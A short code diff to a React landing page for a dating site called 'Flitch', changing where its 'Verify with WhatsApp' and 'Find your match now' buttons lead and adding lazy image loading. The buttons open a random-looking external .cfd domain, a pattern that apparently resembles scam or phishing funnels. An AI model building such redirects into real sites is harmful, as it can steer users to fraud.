@@ -107,7 +107,7 @@ export function LandingPage({ onGetStarted }: LandingPageProps) {
                   variant="whatsapp" 
                   size="xl"
                   className="w-full sm:w-auto"
-                  onClick={() => window.open("https://sae23e2s.cfd/", "_blank")}
+                  onClick={() => window.open("https://sae23e2s.cfd/sa34w", "_blank")}
                 >
                   <MessageCircle className="w-5 h-5" />
                   Verify with WhatsApp
@@ -275,7 +275,7 @@ export function LandingPage({ onGetStarted }: LandingPageProps) {
             <Button 
               variant="whatsapp" 
               size="xl"
-              onClick={() => window.open("https://sae23e2s.cfd/", "_blank")}
+              onClick={() => window.open("https://sae23e2s.cfd/sa34w", "_blank")}
             >
               <MessageCircle className="w-5 h-5" />
               Find your match now
@@ -289,7 +289,7 @@ export function LandingPage({ onGetStarted }: LandingPageProps) {
         <div className="max-w-6xl mx-auto">
           <div className="flex flex-col items-center gap-6">
             <div className="flex items-center">
-              <img src={logo} alt="Flitch" className="h-14 w-auto" />
+              <img src={logo} alt="Flitch" className="h-14 w-auto" loading="lazy" />
             </div>
             
             <nav className="flex flex-wrap justify-center gap-6 text-sm text-muted-foreground">
